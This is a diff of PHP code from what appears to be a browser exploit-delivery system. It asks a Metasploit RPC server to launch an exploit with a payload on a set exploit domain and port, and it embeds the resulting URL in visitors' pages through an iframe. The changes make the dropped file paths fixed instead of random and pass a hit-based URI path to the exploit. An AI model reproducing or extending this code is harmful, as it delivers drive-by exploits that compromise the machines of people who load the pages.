@@ -51,13 +51,17 @@
       
       if (isset($throw_id))
       {
-        $load_file_path = '/var/www/'. RAND_STR . '-' . $throw_id;
-        $load_url = WL_URL . "/" .  RAND_STR . '-' . $throw_id;
+		  $load_file_path = '/var/www/'. $throw_id;
+		  $load_url = WL_URL . "/". $throw_id;
+        #$load_file_path = '/var/www/'. RAND_STR . '-' . $throw_id;
+        #$load_url = WL_URL . "/" .  RAND_STR . '-' . $throw_id;
       }
       else
       {
-        $load_file_path = '/var/www/'. RAND_STR . '-p';
-        $load_url = WL_URL . "/" . RAND_STR . '-p';
+		$load_file_path = '/var/www/PSp';
+		$load_url = WL_URL . "/Psp";
+        #$load_file_path = '/var/www/'. RAND_STR . '-p';
+        #$load_url = WL_URL . "/" . RAND_STR . '-p';
       }
       
       $load_file_data = "<?php define ('THROW_ID', '" . $throw_id . "'); ?>\n";
@@ -71,8 +75,12 @@
       debug("load_url: " . $load_url);
       $msf_cmd_option = $msf_cmd_option_one . $load_url . $msf_cmd_option_two;
       debug("msf_cmd_option: " . $msf_cmd_option);
-      
-      $msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
+
+		$msf_exploit_name = substr(strrchr($msf_exploit_full_path, "/"), 1 );
+		#$msf_uripath = $hit_id . $msf_exploit_name;
+		$msf_uripath = $hit_id;
+
+      $msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option, $msf_uripath);
       $innerReturn = $innerReturn . throw_iframe($msf_url);
       
       $GLOBALS['throw_count_be'] = $GLOBALS['throw_count_be'] + 1;
@@ -769,7 +777,8 @@
     else
     {
       // INSERT failed
-      $hit_id = NULL;
+      #$hit_id = NULL;
+		$hit_id = "unknown";
     }
     //mysqli_free_result($r);
     //mysqli_close($dbc);
